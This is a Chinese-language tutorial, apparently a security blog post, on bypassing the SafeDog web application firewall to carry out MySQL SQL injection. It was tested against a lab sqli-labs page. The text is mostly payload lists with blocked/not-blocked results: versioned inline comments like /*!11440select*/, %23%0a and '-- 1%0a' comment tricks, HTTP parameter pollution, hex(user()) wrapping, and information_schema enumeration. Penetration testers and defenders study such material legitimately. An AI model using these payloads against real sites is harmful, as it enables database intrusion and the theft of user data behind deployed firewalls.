# 0x00 简介
其实我们过这些waf就是个正则的绕过，因为这种通用型的waf，需要考虑到用户体验，他不能出现什么东西就直接拦截，比正则过滤的一些好绕一点，如何成功绕过我们需要具备对mysql各个函数、语法、特性的熟悉，然后通过不断的fuzz来测试出我们想要的payload的
每个狗的版本不同，他的正则也是不同的所以有的payload在最新版可以用，在老版本就可能用不上，当你的知识量有一定的积累后，绕过waf或许就很简单，
如何快速的提升自己的这些知识，多看文章，多看官方手册。
# 0x01 探索 and
实验环境 ： win2003 apache 安全狗4.0.23957
首先我们来探索简单的语句 `and 1=1`
```
and 1    拦截
and '1'  拦截
and a    不拦截
and 'a'  拦截
and !    不拦截
and 1+1  拦截
and 1+a  拦截
and hex(1) 不拦截
```
通过测试我们发现当 and 后面跟上 数字型和字符型时他会给我们拦截掉 ，其实我们在安全狗的规则里面可以看到他拦截 and 和 or 所以我们有2个思路
1. 用其他字符替换 and 或者 or 
2. 带入的不是字符串和数字型，带入一个特殊符号
针对第一种我们可以去看看运算符号 随便找到几个`| ^ xor & / * && ||` 等等还有很多
```
mysql> select '1'|1;
+-------+
| '1'|1 |
+-------+
|     1 |
+-------+
1 row in set (0.00 sec)
mysql> select '1'&1;
+-------+
| '1'&1 |
+-------+
|     1 |
+-------+
1 row in set (0.00 sec)
mysql> select '1'^1;
+-------+
| '1'^1 |
+-------+
|     0 |
+-------+
1 row in set (0.00 sec)
```
知道这个了我们带入我们的语法就很简单了 通过运算符来改变ID的值 查看页面是否变化 这是可行的。
```
mysql> select * from admin where id ='1'|2-- +';
    -> ;
+------+----------+----------+
| id   | username | password |
+------+----------+----------+
|    3 | bdmin    | fdmin    |
+------+----------+----------+
1 row in set (0.00 sec)
mysql> select * from admin where id ='1'|1-- +';
    -> ;
+------+----------+----------+
| id   | username | password |
+------+----------+----------+
|    1 | cdmin    | bdmin    |
+------+----------+----------+
1 row in set (0.00 sec)
```
经过测试你还会发现他的正则不全`&& true` 也是可以的。
那我们可以不可以正面刚`and` `or` 呢，当然也是可行的，前面我们测试过 `and hex(1)` 不拦截其实已经可以拿来判断了，但是我们还要深入的探究 
`and hex(1)=` 也是不拦截的 但是后面加入字符型和数字型他又开始拦截，所以我们可以猜测 他判断 = 左右的字符类型，经过测试就能出来很多我们想要的
```
and ~1>1
and hex(1)>-1
and hex(1)>~1
```
再深入探究 你就会发现 安全狗他只在乎 数字型的正数，而不在乎负数，也就是`and -2<-1` 就能过狗，也可能是`-` 绕过了他的正则
# 0x02 探索 union select 
1.  内联注释绕过
```
union    不拦截
select   不拦截
union select 拦截
union 各种字符 select 拦截
union/*select*/ 不拦截
```
通过简单的测试我们发现安全狗还是认识我们我们的注释的符号的,所以我们就需要通过这个来绕过我们的安全狗，前面符号一章我讲过注释符号的几种，我们主要使用的是
内联注释 `/*!/*!*/` 
```
http://192.168.59.129/Less-1/?id=1' union/*!/*!50000select*/ 1,2,3--+  拦截
http://192.168.59.129/Less-1/?id=1' union/*!/*!5select*/ 1,2,3--+  不拦截
```
为什么不拦截 ，因为50000是他的版本号，你多一位少一位语句是不能能正常执行的，所以他就放行了，那么我们可以用burp来遍历这个值呢，结果的确是我们想要的
```
http://192.168.59.129/Less-1/?id=1' union/*!/*!11440select*/ 1,2,3--+ 不拦截
http://192.168.59.129/Less-1/?id=1' union/*!11441/*!11440select*/ 1,2,3--+ 不拦截
http://192.168.59.129/Less-1/?id=1' union/*!11440select*/ 1,2,3--+ 不拦截
http://192.168.59.129/Less-1/?id=-1' union/*!11440/**/%0aselect*/ 1,2,3--+  不拦截
```
这句bypass的核心就在于版本号,然后你就感觉fuzz了千种姿势,但是核心还是这个，最简也是这个,万变不离其宗。
2.  注释绕过
联想注释我们还知道有 --  #  那么他们可以利用吗，当然是肯定的，其实很久以前就有大佬发过这个语句了是
`union %23%0aselect` 因为这些都是单行注释，而%0a 是换行的url编码,大家可以换行后用url编码看看，就是这个，
但是这样已经被加入规则库了，如何绕过呢 非常简单 当然这是个fuzz的过程，其实我只想写出思路，而不是直接给payload。
```
union %23%0aselect 拦截
union %23select 拦截
union a%23 select 不拦截
union all%23 select 不拦截
union all%23%0a select 不拦截
union %23%0aall select 不拦截
```
有时候fuzz右边不行 不如看看左边 为什么可以加all 这个你就得看看mysql手册了，其实测试到最后发现%23%0a中间不能加字符否则会被拦截。
3.  -- 注释绕过
-- 其实大佬们也一样很早说了不过最初的姿势是 `-- %0a` 当然已经被加入豪华午餐了，所以我们来测试 
```
union all -- %0a select 拦截
union  -- ()%0a select 拦截
union  -- 1%0a select 不拦截
union  -- hex()%0a select 不拦截
```
懂我意思吧，怎么绕出来，发挥你的现象，总之俩开花。
4. 老生常谈 hpp 被人遗忘的手法
前面说过 `/**/` 里面的内容安全狗基本不管了，那么我们用hpp 参数污染来绕过就很简单了
照成这个手法的原因是 web server 对参数的解析问题 在php/apache 中 它总解析最后一个id
```
http://192.168.59.129/Less-1/?id=-1' /*&id='union select 1,user(),3 -- +*/
```
# 0x03 注入
既然绕过了 `union select` 那么注入就简单了 首先来看个 `user()` ,因为它是被拦截的所以我们需要简单的绕过它
```
user()   拦截
user/**/() 拦截
user/**/(/**/) 拦截
hex(user/**/(/**/)) 不拦截
```
接着就是爆库名
```
union  -- hex()%0a select 1,schema_name,3 from `information_schema`.schemata limit 1,1
```
接下来的流传都差不多了 关键点就是在于 from 后面这块 后面的我以这个 `information_schema.schemata` 为例展示几种思路可能有的不能过
```
`information_schema`.schemata
`information_schema`.`schemata`
information_schema.`schemata`
(information_schema.schemata)
information_schema/**/.schemata
```
# 0x04 文末
这么多手法又有多少人认真看了呢，认真去试过，探索。
#### 本文如有错误，请及时提醒，避免误导他人
* author：404